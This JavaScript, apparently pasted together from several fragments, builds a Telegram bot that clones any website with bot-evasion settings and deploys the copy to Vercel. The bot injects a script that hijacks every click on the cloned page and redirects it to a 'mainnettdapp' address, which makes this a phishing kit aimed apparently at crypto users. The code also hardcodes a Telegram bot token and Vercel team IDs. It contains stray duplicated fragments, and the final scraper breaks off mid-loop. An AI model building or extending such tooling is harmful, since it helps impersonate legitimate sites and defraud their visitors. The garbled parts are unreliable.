const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const cheerio = require("cheerio");
const fs = require("fs-extra");
const path = require("path");

puppeteer.use(StealthPlugin());

(async () => {
  const siteUrl = "https://vercel.com/docs/rest-api/reference/endpoints/certs/get-cert-by-id";
  const outputDir = path.join(__dirname, "cloned");

  const assetCache = new Map();

  // Function to sanitize file paths
  const sanitizePath = (pathname) => {
    return pathname
      .replace(/[:*?"<>|]/g, "_") // Replace invalid Windows characters
      .replace(/^-+/, "") // Remove leading dashes
      .replace(/\/+/g, "/") // Normalize slashes
      .replace(/^\/+/, ""); // Remove leading slashes
  };

  try {
    // Ensure output directory
    await fs.ensureDir(outputDir, { mode: 0o755 });

    // Launch browser
    const browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
      ],
    });

    const page = await browser.newPage();

    // Bot evasion
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, "webdriver", { get: () => false });
      Object.defineProperty(navigator, "platform", { get: () => "Win32" });
      Object.defineProperty(navigator, "vendor", { get: () => "Google Inc." });
      Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
      window.chrome = { runtime: {} };
      Object.defineProperty(navigator, "plugins", {
        get: () => [
          { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer" },
          { name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai" },
        ],
      });
    });

    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    );

    await page.setRequestInterception(true);

    // Handle requests
    page.on("request", (req) => {
      const resourceType = req.resourceType();
      const url = req.url();
      if (["beacon", "csp_report"].includes(resourceType)) {
        req.abort();
        return;
      }
      if (/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|json)$/.test(url)) {
        req.continue({
          headers: {
            ...req.headers(),
            Referer: siteUrl,
            Accept: resourceType === "stylesheet" ? "text/css" : resourceType === "script" ? "*/*" : "image/*,font/*",
          },
        });
      } else {
        req.continue();
      }
    });

    // Capture assets
    page.on("requestfinished", async (req) => {
      const url = req.url();
      if (url.startsWith("data:")) return;

      try {
        const response = await req.response();
        if (!response || !response.ok()) {
          console.warn(`‚ö†Ô∏è Invalid response for ${url}: Status ${response?.status()}`);
          return;
        }

        const contentType = response.headers()["content-type"] || "";
        if (!/(css|javascript|font|image|svg|octet-stream|json)/.test(contentType)) {
          console.warn(`‚ö†Ô∏è Skipped ${url}: Invalid content-type ${contentType}`);
          return;
        }

        const buffer = await response.buffer();
        const pathname = sanitizePath(new URL(url, siteUrl).pathname);
        assetCache.set(pathname, buffer);
        console.log(`üì¶ Intercepted: ${pathname} (${contentType})`);
      } catch (err) {
        console.warn(`‚ö†Ô∏è Failed intercept: ${url} - ${err.message}`);
      }
    });

    // Navigate with extended wait
    try {
      await page.goto(siteUrl, { waitUntil: "networkidle0", timeout: 60000 });
    } catch (err) {
      console.warn("‚ö†Ô∏è Navigation failed, retrying with domcontentloaded...", err.message);
      await page.goto(siteUrl, { waitUntil: "domcontentloaded", timeout: 30000 });
    }
    await page.waitForSelector("body", { timeout: 30000 });
    await page.mouse.move(Math.random() * 800, Math.random() * 600); // Simulate human behavior
    await new Promise((resolve) => setTimeout(resolve, 20000)); // Extended wait for dynamic assets

    // Extract HTML, stylesheets, and inline styles
    const { html, stylesheets, inlineStyles } = await page.evaluate(() => {
      const links = Array.from(document.querySelectorAll('link[rel="stylesheet"], link[rel="preload"][as="style"]')).map(l => l.href);
      const styles = Array.from(document.querySelectorAll('style')).map(s => s.innerText);
      return {
        html: document.documentElement.outerHTML,
        stylesheets: links,
        inlineStyles: styles,
      };
    });

    if (!html || html.length < 100) {
      throw new Error("‚ùå Empty or invalid HTML content");
    }
    const $ = cheerio.load(html);

    $("base").remove();

    // Save inline styles
    inlineStyles.forEach((style, index) => {
      const styleId = `inline-style-${index}`;
      $("head").append(`<style id="${styleId}">${style}</style>`);
      console.log(`‚úÖ Added inline style: ${styleId}`);
    });

    // Process external CSS
    const cssDir = path.join(outputDir, "css");
    await fs.ensureDir(cssDir);
    for (const href of stylesheets) {
      if (!href || href.startsWith("data:")) continue;

      try {
        const fullUrl = new URL(href, siteUrl);
        const pathname = sanitizePath(fullUrl.pathname);
        const localCssPath = path.join("css", path.basename(pathname)).replace(/\\/g, "/");
        const savePath = path.join(outputDir, localCssPath);

        let cssBuffer = assetCache.get(pathname);
        let contentType = "text/css";

        // Fetch CSS if not in cache
        if (!cssBuffer) {
          console.warn(`‚ö†Ô∏è CSS not in cache, fetching: ${href}`);
          const resp = await page.goto(fullUrl.href, { waitUntil: "networkidle0", timeout: 15000 });
          if (!resp.ok()) {
            console.warn(`‚ö†Ô∏è Failed to fetch CSS: ${href} - Status ${resp.status()}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
            continue;
          }
          contentType = resp.headers()["content-type"] || "";
          if (!contentType.includes("text/css")) {
            console.warn(`‚ö†Ô∏è Invalid CSS content-type: ${contentType} for ${href}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
            continue;
          }
          cssBuffer = await resp.buffer();
          assetCache.set(pathname, cssBuffer);
        }

        const cssText = cssBuffer.toString("utf-8");
        if (!cssText) {
          console.warn(`‚ö†Ô∏è Empty CSS content: ${href}`);
          $("head").append(`<link rel="stylesheet" href="${href}">`);
          continue;
        }

        // Rewrite URLs in CSS
        const rewrittenCss = cssText.replace(
          /url\(['"]?([^'")]+)['"]?\)/g,
          (_, assetUrl) => {
            try {
              const assetPath = sanitizePath(new URL(assetUrl, fullUrl).pathname);
              if (assetCache.has(assetPath)) {
                console.log(`‚úÖ Rewrote CSS URL: ${assetUrl} -> /${assetPath}`);
                return `url(/${assetPath})`;
              }
              console.warn(`‚ö†Ô∏è CSS asset not found: ${assetUrl}`);
              return `url(${assetUrl})`;
            } catch (err) {
              console.warn(`‚ö†Ô∏è Failed to rewrite CSS URL: ${assetUrl} - ${err.message}`);
              return `url(${assetUrl})`;
            }
          }
        );

        // Save CSS
        await fs.ensureDir(path.dirname(savePath));
        await fs.writeFile(savePath, rewrittenCss);
        console.log(`‚úÖ Saved CSS: ${savePath}`);

        // Inline CSS or use local link
        try {
          $("head").append(`<style>${rewrittenCss}</style>`);
          console.log(`üé® Inlined CSS: ${href}`);
        } catch (err) {
          console.warn(`‚ö†Ô∏è Failed to inline CSS, using local link: ${href} - ${err.message}`);
          $("head").append(`<link rel="stylesheet" href="/${localCssPath}">`);
        }
      } catch (err) {
        console.warn(`‚ùå Failed to process CSS: ${href} - ${err.message}`);
        $("head").append(`<link rel="stylesheet" href="${href}">`);
      }
    }

    // Save other assets
    for (const [pathname, buffer] of assetCache.entries()) {
      if (pathname.startsWith("data:")) continue;
      const sanitizedPath = sanitizePath(pathname);
      const fullPath = path.join(outputDir, sanitizedPath);
      try {
        await fs.ensureDir(path.dirname(fullPath));
        await fs.writeFile(fullPath, buffer);
        console.log(`‚úÖ Saved asset: ${fullPath}`);
      } catch (err) {
        console.warn(`‚ùå Failed to save asset: ${sanitizedPath} - ${err.message}`);
      }
    }

    // Rewrite asset paths in HTML
    $("[href], [src]").each((_, el) => {
      const $el = $(el);
      const attr = $el.attr("href") ? "href" : "src";
      const val = $el.attr(attr);

      if (!val || val.startsWith("data:") || val.startsWith("mailto:") || val.startsWith("javascript:")) return;

      try {
        const full = new URL(val, siteUrl);
        const pathname = sanitizePath(full.pathname);
        if (assetCache.has(pathname)) {
          $el.attr(attr, `/${pathname}`);
          console.log(`‚úÖ Rewrote ${attr}: ${val} -> /${pathname}`);
        } else {
          console.warn(`‚ö†Ô∏è Asset not found for ${attr}: ${val}`);
          $el.attr(attr, val); // Keep original if not found
        }
      } catch (err) {
        console.warn(`‚ö†Ô∏è Failed to rewrite ${attr}: ${val} - ${err.message}`);
      }
    });

    // Save HTML
    const outputHtmlPath = path.join(outputDir, "index.html");
    await fs.writeFile(outputHtmlPath, $.html());
    console.log("‚úÖ Clone complete:", outputHtmlPath);

    await browser.close();
  } catch (err) {
    console.error("‚ùå Error:", err.message, err.stack);
    process.exit(1);
  }
})();




  await fs.outputFile(path.join(outputDir, "index.html"), $.html());
        console.log("‚úÖ Done! Saved at cloned/index.html");

        await ctx.reply(
          "‚úÖ Site cloned using original CSS links! Ready for deploy.",
          Markup.inlineKeyboard([Markup.button.callback("üöÄ Host Site", "host")])
        );



  console.error("‚ùå Clone error:", err.message);
        await ctx.reply("‚ö†Ô∏è Failed to clone site.");







































        const { Telegraf, Markup } = require("telegraf");
const axios = require("axios");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const cheerio = require("cheerio");
const fs = require("fs-extra");
const path = require("path");
const { URL } = require("url");
const { Vercel } = require("@vercel/sdk");
require("dotenv").config();

const vercel = new Vercel({
  bearerToken: process.env.vercelToken, // replace with your real token
});
const bot = new Telegraf("8038607225:AAHttTS-SEK_N4HiBwiu1BitXEb-45AJ9Q8");
puppeteer.use(StealthPlugin());

// Track per-user states
const userStates = new Map();

// /start command
bot.start((ctx) => {
  ctx.reply("‚úÖ Welcome! Use /clone to fetch a website‚Äôs HTML.");
});

// /run command
bot.command("run", (ctx) => {
  ctx.reply("üèÉ‚Äç‚ôÇÔ∏è Running...");
});

// /clone command ‚Äì ask for website
bot.command("clone", (ctx) => {
  ctx.reply(
    "üîó Enter the <b>website URL</b> you want to clone (must start with <code>https://</code>)\n\n‚úÖ Make sure the site is live and accessible.",
    { parse_mode: "HTML" }
  );

  userStates.set(ctx.chat.id, "awaiting_url");
});

const userFolders = new Map();

bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  // === CASE 1: CLONING ===
  if (state === "awaiting_url") {
    const siteUrl = ctx.message.text.toLowerCase();
    if (!siteUrl.startsWith("https://")) {
      return ctx.reply("‚ùå Enter a valid link that starts with *https://*", {
        parse_mode: "Markdown",
      });
    }

    userStates.delete(ctx.chat.id);
    await ctx.reply(
      "üîç Cloning the full website...\n\nHang tight ‚Äî this might take a little while."
    );

    (async () => {
      const outputDir = path.join(__dirname, "cloned");
      const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
      const assetCache = new Map();

      // Clear the cloned folder before starting
      try {
        await fs.remove(outputDir);
        console.log("‚úÖ Cleared existing cloned folder");
      } catch (err) {
        console.warn(`‚ö†Ô∏è Failed to clear cloned folder: ${err.message}`);
      }

      // Ensure output directory
      await fs.ensureDir(outputDir, { mode: 0o755 });

      // Function to sanitize file paths
      const sanitizePath = (pathname) => {
        return pathname
          .replace(/[:*?"<>|]/g, "_") // Replace invalid Windows characters
          .replace(/^-+/, "") // Remove leading dashes
          .replace(/\/+/g, "/") // Normalize slashes
          .replace(/^\/+/, ""); // Remove leading slashes
      };

      try {
        // Ensure output directory
        await fs.ensureDir(outputDir, { mode: 0o755 });

        // Launch browser
        const browser = await puppeteer.launch({
          headless: "new",
          args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-blink-features=AutomationControlled",
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
          ],
        });

        const page = await browser.newPage();

        // Bot evasion
        await page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, "webdriver", { get: () => false });
          Object.defineProperty(navigator, "platform", { get: () => "Win32" });
          Object.defineProperty(navigator, "vendor", {
            get: () => "Google Inc.",
          });
          Object.defineProperty(navigator, "languages", {
            get: () => ["en-US", "en"],
          });
          window.chrome = { runtime: {} };
          Object.defineProperty(navigator, "plugins", {
            get: () => [
              { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer" },
              {
                name: "Chrome PDF Viewer",
                filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai",
              },
            ],
          });
        });

        await page.setUserAgent(
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        );

        await page.setRequestInterception(true);

        // Handle requests
        page.on("request", (req) => {
          const resourceType = req.resourceType();
          const url = req.url();
          if (["beacon", "csp_report"].includes(resourceType)) {
            req.abort();
            return;
          }
          if (
            /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|json)$/.test(url)
          ) {
            req.continue({
              headers: {
                ...req.headers(),
                Referer: siteUrl,
                Accept:
                  resourceType === "stylesheet"
                    ? "text/css"
                    : resourceType === "script"
                    ? "*/*"
                    : "image/*,font/*",
              },
            });
          } else {
            req.continue();
          }
        });

        // Capture assets
        page.on("requestfinished", async (req) => {
          const url = req.url();
          if (url.startsWith("data:")) return;

          try {
            const response = await req.response();
            if (!response || !response.ok()) {
              console.warn(
                `‚ö†Ô∏è Invalid response for ${url}: Status ${response?.status()}`
              );
              return;
            }

            const contentType = response.headers()["content-type"] || "";
            if (
              !/(css|javascript|font|image|svg|octet-stream|json)/.test(
                contentType
              )
            ) {
              console.warn(
                `‚ö†Ô∏è Skipped ${url}: Invalid content-type ${contentType}`
              );
              return;
            }

            const buffer = await response.buffer();
            const pathname = sanitizePath(new URL(url, siteUrl).pathname);
            assetCache.set(pathname, buffer);
            console.log(`üì¶ Intercepted: ${pathname} (${contentType})`);
          } catch (err) {
            console.warn(`‚ö†Ô∏è Failed intercept: ${url} - ${err.message}`);
          }
        });

        // Navigate with extended wait
        try {
          await page.goto(siteUrl, {
            waitUntil: "networkidle0",
            timeout: 60000,
          });
        } catch (err) {
          console.warn(
            "‚ö†Ô∏è Navigation failed, retrying with domcontentloaded...",
            err.message
          );
          await page.goto(siteUrl, {
            waitUntil: "domcontentloaded",
            timeout: 30000,
          });
        }
        await page.waitForSelector("body", { timeout: 30000 });
        await page.mouse.move(Math.random() * 800, Math.random() * 600); // Simulate human behavior
        await new Promise((resolve) => setTimeout(resolve, 20000)); // Extended wait for dynamic assets

        // Extract HTML, stylesheets, and inline styles
        const { html, stylesheets, inlineStyles } = await page.evaluate(() => {
          const links = Array.from(
            document.querySelectorAll(
              'link[rel="stylesheet"], link[rel="preload"][as="style"]'
            )
          ).map((l) => l.href);
          const styles = Array.from(document.querySelectorAll("style")).map(
            (s) => s.innerText
          );
          return {
            html: document.documentElement.outerHTML,
            stylesheets: links,
            inlineStyles: styles,
          };
        });

        if (!html || html.length < 100) {
          throw new Error("‚ùå Empty or invalid HTML content");
        }
        const $ = cheerio.load(html);

        $("base").remove();

        // Remove href from all <a> tags
        $("a[href]").each((_, el) => {
          $(el).removeAttr("href");
          console.log("‚úÖ Removed href from <a> tag");
        });

        // Save inline styles
        inlineStyles.forEach((style, index) => {
          const styleId = `inline-style-${index}`;
          $("head").append(`<style id="${styleId}">${style}</style>`);
          console.log(`‚úÖ Added inline style: ${styleId}`);
        });

        // Process external CSS
        const cssDir = path.join(outputDir, "css");
        await fs.ensureDir(cssDir);
        for (const href of stylesheets) {
          if (!href || href.startsWith("data:")) continue;

          try {
            const fullUrl = new URL(href, siteUrl);
            const pathname = sanitizePath(fullUrl.pathname);
            const localCssPath = path
              .join("css", path.basename(pathname))
              .replace(/\\/g, "/");
            const savePath = path.join(outputDir, localCssPath);

            let cssBuffer = assetCache.get(pathname);
            let contentType = "text/css";

            // Fetch CSS if not in cache
            if (!cssBuffer) {
              console.warn(`‚ö†Ô∏è CSS not in cache, fetching: ${href}`);
              const resp = await page.goto(fullUrl.href, {
                waitUntil: "networkidle0",
                timeout: 15000,
              });
              if (!resp.ok()) {
                console.warn(
                  `‚ö†Ô∏è Failed to fetch CSS: ${href} - Status ${resp.status()}`
                );
                $("head").append(`<link rel="stylesheet" href="${href}">`);
                continue;
              }
              contentType = resp.headers()["content-type"] || "";
              if (!contentType.includes("text/css")) {
                console.warn(
                  `‚ö†Ô∏è Invalid CSS content-type: ${contentType} for ${href}`
                );
                $("head").append(`<link rel="stylesheet" href="${href}">`);
                continue;
              }
              cssBuffer = await resp.buffer();
              assetCache.set(pathname, cssBuffer);
            }

            const cssText = cssBuffer.toString("utf-8");
            if (!cssText) {
              console.warn(`‚ö†Ô∏è Empty CSS content: ${href}`);
              $("head").append(`<link rel="stylesheet" href="${href}">`);
              continue;
            }

            // Rewrite URLs in CSS
            const rewrittenCss = cssText.replace(
              /url\(['"]?([^'")]+)['"]?\)/g,
              (_, assetUrl) => {
                try {
                  const assetPath = sanitizePath(
                    new URL(assetUrl, fullUrl).pathname
                  );
                  if (assetCache.has(assetPath)) {
                    console.log(
                      `‚úÖ Rewrote CSS URL: ${assetUrl} -> /${assetPath}`
                    );
                    return `url(/${assetPath})`;
                  }
                  console.warn(`‚ö†Ô∏è CSS asset not found: ${assetUrl}`);
                  return `url(${assetUrl})`;
                } catch (err) {
                  console.warn(
                    `‚ö†Ô∏è Failed to rewrite CSS URL: ${assetUrl} - ${err.message}`
                  );
                  return `url(${assetUrl})`;
                }
              }
            );

            // Save CSS
            await fs.ensureDir(path.dirname(savePath));
            await fs.writeFile(savePath, rewrittenCss);
            console.log(`‚úÖ Saved CSS: ${savePath}`);

            // Inline CSS or use local link
            try {
              $("head").append(`<style>${rewrittenCss}</style>`);
              console.log(`üé® Inlined CSS: ${href}`);
            } catch (err) {
              console.warn(
                `‚ö†Ô∏è Failed to inline CSS, using local link: ${href} - ${err.message}`
              );
              $("head").append(
                `<link rel="stylesheet" href="/${localCssPath}">`
              );
            }
          } catch (err) {
            console.warn(`‚ùå Failed to process CSS: ${href} - ${err.message}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
          }
        }

        // Save other assets
        for (const [pathname, buffer] of assetCache.entries()) {
          if (pathname.startsWith("data:")) continue;
          const sanitizedPath = sanitizePath(pathname);
          const fullPath = path.join(outputDir, sanitizedPath);
          try {
            await fs.ensureDir(path.dirname(fullPath));
            await fs.writeFile(fullPath, buffer);
            console.log(`‚úÖ Saved asset: ${fullPath}`);
          } catch (err) {
            console.warn(
              `‚ùå Failed to save asset: ${sanitizedPath} - ${err.message}`
            );
          }
        }

        // Rewrite asset paths in HTML
        $("[href], [src]").each((_, el) => {
          const $el = $(el);
          const attr = $el.attr("href") ? "href" : "src";
          const val = $el.attr(attr);

          if (
            !val ||
            val.startsWith("data:") ||
            val.startsWith("mailto:") ||
            val.startsWith("javascript:")
          )
            return;

          try {
            const full = new URL(val, siteUrl);
            const pathname = sanitizePath(full.pathname);
            if (assetCache.has(pathname)) {
              $el.attr(attr, `/${pathname}`);
              console.log(`‚úÖ Rewrote ${attr}: ${val} -> /${pathname}`);
            } else {
              console.warn(`‚ö†Ô∏è Asset not found for ${attr}: ${val}`);
              $el.attr(attr, val); // Keep original if not found
            }
          } catch (err) {
            console.warn(
              `‚ö†Ô∏è Failed to rewrite ${attr}: ${val} - ${err.message}`
            );
          }
        });

        $("body").append(`
 <style>
   a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
     cursor: pointer !important;
   }
 </style>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const elements = document.querySelectorAll("a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
   elements.forEach(el => {
     el.onclick = null;
     el.removeAttribute("onclick");
     if (window.jQuery && typeof jQuery === "function") {
       try { jQuery(el).off("click"); } catch (err) {}
     }
     const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
     if (reactKey) delete el[reactKey];
     el.addEventListener("click", (e) => {
       e.preventDefault();
       e.stopImmediatePropagation();
       window.location.href = ${JSON.stringify(redirectURL)};
     }, true);
   });
 });
 </script>
 `);

        // Save HTML
        const outputHtmlPath = path.join(outputDir, "index.html");
        await fs.writeFile(outputHtmlPath, $.html());
        console.log("‚úÖ Clone complete:", outputHtmlPath);

        await fs.outputFile(path.join(outputDir, "index.html"), $.html());
        console.log("‚úÖ Done! Saved at cloned/index.html");

        await ctx.reply(
          "‚úÖ Site cloned using original CSS links! Ready for deploy.",
          Markup.inlineKeyboard([
            Markup.button.callback("üöÄ Host Site", "host"),
          ])
        );
      } catch (err) {
        console.error("‚ùå Error:", err.message, err.stack);
        console.error("‚ùå Clone error:", err.message);
        await ctx.reply("‚ö†Ô∏è Failed to clone site.");
        process.exit(1);
      }
    })();
  }

  // === CASE 2: HOSTING ===
  if (state === "awaiting_site_name") {
    userStates.delete(ctx.chat.id);
    const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

    if (!siteName || siteName.length < 3) {
      return ctx.reply("‚ùå Site name is too short or invalid. Try again.");
    }

    const folder = "./cloned";
    if (!fs.existsSync(folder)) {
      return ctx.reply("‚ùå No cloned folder found. Please clone a site first.");
    }

    await ctx.reply("üõ†Ô∏è Just a moment...\n\nWe're getting your site ready!");

    const TEXT_FILE_EXTENSIONS = [
      ".html",
      ".js",
      ".css",
      ".json",
      ".txt",
      ".md",
    ];
    const isTextFile = (filePath) =>
      TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

    function getFilesArray(dir, baseDir = dir) {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      let files = [];

      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        const relativePath = path
          .relative(baseDir, fullPath)
          .replace(/\\/g, "/");

        if (entry.isDirectory()) {
          files = files.concat(getFilesArray(fullPath, baseDir));
        } else {
          const fileBuffer = fs.readFileSync(fullPath);
          const data = isTextFile(fullPath)
            ? fileBuffer.toString("utf-8")
            : fileBuffer.toString("base64");

          files.push({ file: relativePath, data });
        }
      }

      return files;
    }

    const files = getFilesArray(folder);

    try {
      const result = await vercel.deployments.createDeployment({
        teamId: "team_RtcpHQkXpOdUuDtn48R0I2HT",
        slug: siteName,
        requestBody: {
          name: siteName,
          project: siteName,
          target: "production",
          files: files,
          projectSettings: {
            framework: null,
            buildCommand: null,
            installCommand: null,
            outputDirectory: ".",
          },
        },
      });

      console.log("‚úÖ Deployment complete!", result);

    setTimeout(() => {
        ctx.reply(
        `‚úÖ *Deployment Successful!*\n\n` +
          `üåê *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
          `üöÄ *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
          `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
          `üéâ Your site is now live on Vercel!`,
        { parse_mode: "Markdown" }
      );
    }, 3000); // Delay to ensure Vercel processes the deployment
    } catch (error) {
      console.error("‚ùå Hosting error:", error);
      ctx.reply("‚ö†Ô∏è Error deploying site. Please try again later.");
    }
  }
});

// Handle "Host" button click
bot.action("host", async (ctx) => {
  ctx.answerCbQuery();
  userStates.set(ctx.chat.id, "awaiting_site_name");
  return ctx.reply(
    "üí° <b>What's the name of your site?</b>\n\n‚ö†Ô∏è Make sure it's unique and hasn't been used before.",
    { parse_mode: "HTML" }
  );
});

// Handle text message (e.g., site name)
bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  if (state !== "awaiting_site_name") return;

  userStates.delete(ctx.chat.id); // Clear state
  const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

  if (!siteName || siteName.length < 3 || siteName.includes(".")) {
    return ctx.reply(
      "‚ö†Ô∏è The site name is too short or invalid.\n\nüö´ Dots (.) are not allowed.\n‚úçÔ∏è Please try again with just the name."
    );
  }

  const folder = "./cloned";
  console.log("Hosting folder:", folder);

  if (!fs.existsSync(folder)) {
    return ctx.reply("‚ùå No cloned folder found. Please clone a site first.");
  }

  const TEXT_FILE_EXTENSIONS = [".html", ".js", ".css", ".json", ".txt", ".md"];
  const isTextFile = (filePath) =>
    TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

  function getFilesArray(dir, baseDir = dir) {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    let files = [];

    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      const relativePath = path.relative(baseDir, fullPath).replace(/\\/g, "/");

      if (entry.isDirectory()) {
        files = files.concat(getFilesArray(fullPath, baseDir));
      } else {
        const fileBuffer = fs.readFileSync(fullPath);
        const data = isTextFile(fullPath)
          ? fileBuffer.toString("utf-8")
          : fileBuffer.toString("base64");

        files.push({ file: relativePath, data });
      }
    }

    return files;
  }

  const files = getFilesArray(folder);

  try {
    const result = await vercel.deployments.createDeployment({
      teamId: "team_AwRWdZTHaoWRoHvGvRg19YS7",
      slug: siteName,
      requestBody: {
        name: siteName,
        project: siteName,
        target: "production",
        files: files,
        projectSettings: {
          framework: null,
          buildCommand: null,
          installCommand: null,
          outputDirectory: ".",
        },
      },
    });

    console.log("‚úÖ Deployment complete!", result);

    ctx.reply(
      `‚úÖ *Deployment Successful!*\n\n` +
        `üåê *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
        `üöÄ *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
        `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
        `üéâ Your site is now live on Vercel!`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("‚ùå Hosting error:", error);
    ctx.reply("‚ö†Ô∏è Error deploying site. Please try again later.");
  }
});

// Start the bot
bot.launch().then(() => {
  console.log("ü§ñ Bot is running...");
});
console.log("ü§ñ Bot is running...");






import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { URL } from "url";

puppeteer.use(StealthPlugin());

async function scrape() {
  const siteUrl = "https://ibroport.netlify.app/";
  const outputDir = path.join(process.cwd(), "cloned");
  const redirectURL = "https://google.com";
  const originalDomain = new URL(siteUrl).origin;

  try {
    // Ensure output directories exist
    await fs.ensureDir(path.join(outputDir, "css"));
    await fs.ensureDir(path.join(outputDir, "js"));
    await fs.ensureDir(path.join(outputDir, "images"));
    await fs.ensureDir(path.join(outputDir, "api"));
    await fs.ensureDir(path.join(outputDir, "resources"));

    // Launch Puppeteer
    const browser = await puppeteer.launch({
      headless: true,
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });
    const page = await browser.newPage();

    // Set user agent and viewport
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    );
    await page.setViewport({ width: 1280, height: 720 });

    // Single request interception handler
    const apiResponses = {};
    const additionalScripts = new Set();
    const additionalImages = new Set();
    const additionalResources = new Set();
    await page.setRequestInterception(true);
    page.on("request", (request) => {
      const resourceType = request.resourceType();
      const url = request.url();
      // Block navigations
      if (["document", "xhr", "fetch"].includes(resourceType) && url !== siteUrl) {
        console.log("üö´ Blocking navigation:", url);
        request.abort();
        return;
      }
      // Capture resources
      if (resourceType === "xhr" || resourceType === "fetch") {
        console.log("üåê API Request:", url);
      } else if (resourceType === "script") {
        console.log("üìú Script Request:", url);
        additionalScripts.add(url);
      } else if (resourceType === "image") {
        console.log("üñºÔ∏è Image Request:", url);
        additionalImages.add(url);
      } else if (["other", "media"].includes(resourceType)) {
        console.log("üì¶ Resource Request:", url);
        additionalResources.add(url);
      }
      request.continue();
    });

    page.on("response", async (response) => {
      const resourceType = response.request().resourceType();
      const url = response.url();
      if (resourceType === "xhr" || resourceType === "fetch") {
        try {
          const json = await response.json();
          apiResponses[url] = json;
          console.log("üì¶ API Response:", url, JSON.stringify(json).slice(0, 100) + "...");
          const fileName = `api-${Date.now()}-${url.split("/").pop() || "data"}.json`;
          await fs.outputFile(path.join(outputDir, "api", fileName), JSON.stringify(json, null, 2));
        } catch (err) {}
      }
    });

    // Monitor DOM changes for dynamic scripts and images
    await page.evaluateOnNewDocument(() => {
      const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (mutation.addedNodes.length) {
            console.log("üîç DOM Change: New nodes added");
            mutation.addedNodes.forEach((node) => {
              if (node.tagName === "SCRIPT" && node.src) {
                console.log("üìú Dynamically added script:", node.src);
                window.__DYNAMIC_SCRIPTS__ = window.__DYNAMIC_SCRIPTS__ || [];
                window.__DYNAMIC_SCRIPTS__.push(node.src);
              }
              if (node.tagName === "IMG" && (node.src || node.getAttribute("data-src") || node.getAttribute("data-lazy-src"))) {
                const src = node.src || node.getAttribute("data-src") || node.getAttribute("data-lazy-src");
                console.log("üñºÔ∏è Dynamically added image:", src);
                window.__DYNAMIC_IMAGES__ = window.__DYNAMIC_IMAGES__ || [];
                window.__DYNAMIC_IMAGES__.push(src);
              }
            });
          }
        });
      });
      observer.observe(document, { childList: true, subtree: true });
    });

    // Navigate and wait for page to stabilize
    console.log(`Navigating to ${siteUrl}...`);
    await page.goto(siteUrl, { waitUntil: "networkidle2", timeout: 60000 });

    // Wait for dynamic content
    try {
      await page.waitForSelector(
        "#__next, main, .container, [data-testid], .dynamic-content, .swap-form, .price-chart, .logo",
        { timeout: 30000 }
      );
      console.log("‚úÖ Initial dynamic content detected");

      // Trigger interactions safely
      await page.evaluate(() => {
        document.querySelectorAll("img, [data-lazy-src], [data-src]").forEach((el) => {
          el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
        });
      });

      // Wait for lazy-loaded content
      let previousHeight = await page.evaluate(() => document.body.scrollHeight);
      let attempts = 0;
      while (attempts < 5) {
        await page.waitForTimeout(3000);
        const currentHeight = await page.evaluate(() => document.body.scrollHeight);
        if (currentHeight > previousHeight) {
          console.log("üìà Page height increased, more content loaded");
          previousHeight = currentHeight;
          attempts = 0;
        } else {
          attempts++;
        }
        await page.evaluate(() => window.scrollBy(0, document.body.scrollHeight));
      }
